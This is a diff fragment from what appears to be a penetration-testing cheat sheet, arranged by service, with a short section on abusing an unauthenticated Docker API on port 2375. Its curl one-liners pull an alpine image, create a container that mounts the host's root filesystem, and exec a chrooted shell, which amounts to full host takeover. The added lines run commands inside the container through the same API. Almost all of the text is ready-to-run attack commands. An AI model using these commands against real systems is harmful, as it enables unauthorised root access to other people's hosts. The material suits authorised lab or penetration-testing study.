@@ -780,7 +780,8 @@ curl -s -X POST http://10.129.121.211:2375/images/create?fromImage=alpine&tag=la
 +---------- Create and Start Container using Image ----------+
 containerID=$(curl -s -X POST http://10.129.121.211:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["sleep", "400"],"HostConfig":{"Binds":["/:/mnt"]}}' | jq -r .Id); curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/start; curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["chroot","/mnt","sh"]}'
 
-
++---------- Execute Command in Container ----------+
+commandID=$(curl -s -X POST http://$TARGET:2375/containers/"$containerID"/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-c","id"]}' | jq -r .Id); curl -s -X POST http://$TARGET:2375/exec/"$commandID"/start -H "Content-Type: application/json" -d '{"Detach":false,"Tty":true}'
 
 [*] (3306) MySQL
 +---------- Spray Service ----------+
